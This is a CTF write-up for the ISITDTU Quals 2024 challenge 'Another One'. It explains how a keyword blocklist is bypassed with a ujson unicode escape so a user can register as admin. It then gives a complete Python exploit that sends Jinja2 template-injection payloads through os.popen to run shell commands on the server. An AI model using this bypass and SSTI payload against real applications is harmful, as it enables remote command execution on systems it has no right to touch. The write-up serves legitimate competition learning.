---
title: "Writeups For ISITDTU Quals 2024"
date: 2024-08-27 14:56 +0700
categories: [Cybersecurity, CTF]
tags: [writeup]
media_subpath: /assets/do-you-think-you-delicious
render_with_liquid: false
---

Another One
For this challenge, at first glance, I'm looking at the
```python
@app.route('/render', methods=['POST'])
def dynamic_template():
    token = request.cookies.get('jwt_token')
    if token:
        try:
            decoded = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            role = decoded.get('role')

            if role != "admin":
                return jsonify(message="Admin only"), 403

            data = request.get_json()
            template = data.get("template")
            rendered_template = render_template_string(template)
            
            return jsonify(message="Done")

        except jwt.ExpiredSignatureError:
            return jsonify(message="Token has expired."), 401
        except jwt.InvalidTokenError:
            return jsonify(message="Invalid JWT."), 401
        except Exception as e:
            return jsonify(message=str(e)), 500
    else:
        return jsonify(message="Where is your token?"), 401
```
This code makes me think of a possible SSTI (Server-Side Template Injection) vulnerability. However, to access it, we need to have the "Admin" role. So, we’ll need a way to obtain or bypass this requirement to proceed.

Looking more deeply in code. and i have found this:
```python
    if "admin" in json_data:
        return jsonify(message="Blocked!")
    data = ujson.loads(json_data)
```
As we looking through the ujson package, we saw that
```python
>>> ujson.dumps("åäö")
'"\\u00e5\\u00e4\\u00f6"'
```
We though that if it can Unicode encode character when dump, can it decode unicode character when loads?
```python
>>> ujson.loads('{"role":"\\u0061dmin"}')
{'role': 'admin'}
```
Well it could.
Therefore the idea is to register a user with role,
```json
{"username":"aaaaaa","password":"aaaaaa","role":"\\u0061dmin"}
```
So the json_data will not contain "admin" but the data does.
We have done the bypass admin role step, so the final thing we need to do is find a way to ssti and get a flag.

```python
#!/usr/bin/env python3
import requests, sys, base64

BASE_URL = sys.argv[1].rstrip("/")
wp = lambda x: f"{BASE_URL}{x}"
_s = requests.session()
from pwn import *

u, p = randoms(10), randoms(10)

print(
    _s.post(
        wp("/register"),
        headers={"Content-Type": "application/json"},
        data=f'{{"username":"{u}", "password":"{p}", "role":"\\u0061dmin"}}',
    ).text
)

token = _s.post(wp("/login"), json={"username": u, "password": p}).json()["message"]

_s.cookies["jwt_token"] = token

while True:
    cmd = input(">")

    cmd = base64.b64encode(cmd.encode()).decode()

    print(
        _s.post(
            wp("/render"),
            json={
                "template": "{{ cycler.__init__.__globals__.os.popen('echo "
                + cmd
                + " | base64 -d | sh').read()}}"
            },
        ).text
    )
    print(_s.get(wp("/static/test")).text)
```
send `mkdir static`, `ls > static/test` then `cat <filename> > static/test`